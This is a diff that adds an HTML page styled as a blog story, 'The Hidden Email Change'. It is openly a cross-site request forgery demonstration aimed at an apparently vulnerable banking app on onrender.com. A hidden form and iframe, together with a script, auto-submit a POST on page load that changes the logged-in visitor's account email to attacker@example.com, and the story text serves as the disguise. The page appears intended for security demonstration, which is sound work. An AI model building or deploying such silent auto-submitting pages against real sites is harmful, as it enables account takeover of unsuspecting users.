@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blog Story: The Hidden Email Change</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <main class="container">
+    <header>
+      <h1>The Hidden Email Change</h1>
+      <p class="subtitle">A short story about a blog, a secret form, and an unexpected arrival in the inbox.</p>
+    </header>
+
+    <article>
+      <p>Once upon a time, there was a blog post that looked completely harmless. It told a story about the power of words, the warmth of small moments, and the way a simple message could travel from one place to another.</p>
+      <p>But behind the scenes, this page carries a hidden surprise: a form that quietly submits itself to another site when the page loads.</p>
+
+      <h2>Story Snapshot</h2>
+      <p>Imagine a user already logged into their online banking profile. They open a seemingly innocent blog post while still authenticated. Because the blog post contains a hidden request to change the email on the banking site, the bank may process it without asking again.</p>
+
+      <blockquote>
+        "Trust is a powerful thing — and so is the browser when it carries your identity across sites."
+      </blockquote>
+    </article>
+
+    <section class="summary">
+      <h2>CSRF Demo Details</h2>
+      <p>This page attempts to change the email on the vulnerable site to:</p>
+      <p class="highlight">attacker@example.com</p>
+      <p>If the target site accepts cross-site POSTs without protection, the email change request will be submitted automatically.</p>
+      <p>Target URL: <code>https://beta-banker.onrender.com/profile/email</code></p>
+    </section>
+  </main>
+
+  <form id="csrfForm" method="POST" action="https://beta-banker.onrender.com/profile/email" target="csrfTarget" class="hidden">
+    <input type="email" name="email" value="attacker@example.com">
+    <button type="submit">Update email</button>
+  </form>
+  <iframe name="csrfTarget" class="hidden" aria-hidden="true"></iframe>
+
+  <script>
+    const vulnerableBase = 'https://beta-banker.onrender.com';
+    const form = document.getElementById('csrfForm');
+    form.action = `${vulnerableBase}/profile/email`;
+
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        form.submit();
+      }, 200);
+    });
+  </script>
+</body>
+</html>
